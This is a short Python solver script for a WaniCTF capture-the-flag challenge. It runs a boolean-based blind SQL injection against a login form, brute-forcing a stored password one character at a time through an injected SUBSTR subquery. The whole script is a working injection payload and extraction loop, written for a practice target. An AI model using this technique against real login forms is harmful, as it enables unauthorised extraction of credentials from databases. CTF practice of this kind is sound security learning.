#!/usr/bin/python3

import requests

url = 'https://watch.web.wanictf.org/'
email = "wanictf21spring@gmail.com"
response = "Crocodiles or true crocodiles are large semiaquatic reptiles that live throughout the tropics in Africa, Asia, the Americas and Australia."
flag = "FLAG{"

for i in range(6, 16):
    for j in range(0x20, 0x7F):
        payload = {
            "email": email,
            "password": f"' OR SUBSTR((SELECT password FROM users WHERE email = '{email}'),{i},1) = '{chr(j)}';"
        }
        r = requests.post(url, data=payload)
        if response in r.text:
            flag += chr(j)
            print(flag)
print("flag is: " + flag)